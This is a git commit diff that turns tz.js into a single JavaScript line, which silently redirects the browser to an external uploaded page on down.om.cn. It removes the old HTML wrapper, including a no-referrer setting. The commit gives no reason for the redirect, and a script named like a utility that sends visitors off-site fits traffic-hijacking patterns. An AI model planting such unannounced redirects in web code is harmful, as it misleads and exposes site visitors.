f2815d9101c9017bc34a346269588a940d98875e
sparrow6s <136680608+sparrow6s@users.noreply.github.com>
2023-06-15 15:04:36 +0800

    Add files via upload

--- tz.js
+++ tz.js
@@ -1,13 +1,1 @@
-<html>
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="x-ua-compatible" content="IE=edge" >
-  <meta name="referrer" content="no-referrer"/>
-  <title></title>
-</head>
-<body>
-<script type="text/javascript">
 window.location.href='https://down.om.cn/v3/Uploads/Material/2023-04-30/Qe5SSXezsHS8JRdBEHrfkapYjxbcnHhM.html?id=6C0p2K&sign=168675595811'
-</script>
-</body>
-</html>
